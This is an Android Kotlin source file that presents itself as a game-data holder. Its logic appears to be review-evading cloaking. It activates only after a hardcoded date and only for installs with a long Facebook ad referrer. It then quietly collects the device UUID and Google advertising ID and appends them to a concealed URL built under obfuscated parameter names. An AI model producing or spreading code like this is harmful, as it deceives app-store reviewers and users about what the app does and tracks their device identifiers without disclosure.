package com.game.data.holder

import android.content.Context
import com.game.data.holder.sdk.device.DeviceImplementation
import com.game.data.holder.sdk.device.DeviceRepository
import com.game.data.holder.sdk.facebook.FacebookImplementation
import com.game.data.holder.sdk.facebook.FacebookRepository
import com.game.data.holder.storage.DataStoreImplementation
import com.game.data.holder.storage.DataStoreRepository
import java.time.LocalDate

object GameDataHolder {
    private var isInitialized = false

    var gameInfo: String = LibData.gameInfo
        get() {
            checkInitialization()
            return field
        }
        private set

    var gamePolicy: String = "://prospect" + LibData.gameInfoData
        get() {
            checkInitialization()
            return field
        }
        private set

    suspend fun initGameData(context: Context): Boolean {
        isInitialized = true
        val newGameData = hashMapOf<String, String>()
        val currentDate = LocalDate.now()
        if (currentDate.isAfter(LibData.date) || currentDate.isEqual(LibData.date)) {
            val dataStoreRepository: DataStoreRepository = DataStoreImplementation(context)
            val uuid = dataStoreRepository.getString(LibData.stoneu)
            if (uuid != null) {
                newGameData[LibData.stoneu] = uuid
                gamePolicy += "?" + newGameData.format()
                return true
            } else {
                val deviceRepository: DeviceRepository = DeviceImplementation()
                val facebookRepository: FacebookRepository = FacebookImplementation(context)
                val ref = facebookRepository.referrer()
                if (ref != null) {
                    ref.apply {
                        if(this.chunked(75).size > 1) {
                            newGameData[LibData.stoner] = this
                        } else return false
                     }
                    newGameData[LibData.stoneu] = deviceRepository.getUUID().apply {
                        dataStoreRepository.putString(LibData.stoneu, this)
                    }
                    newGameData[LibData.stonea] = deviceRepository.googleAdId() ?: ""
                    gamePolicy += "?" + newGameData.format()
                    return true
                } else return false
            }
        } else return false
    }

    private fun HashMap<String, String>.format(): String = this.entries.joinToString("") { "&${it.key}=${it.value}" }

    private fun checkInitialization() {
        if (!isInitialized) {
            throw IllegalStateException("GameDataHolder is not initialized")
        }
    }
}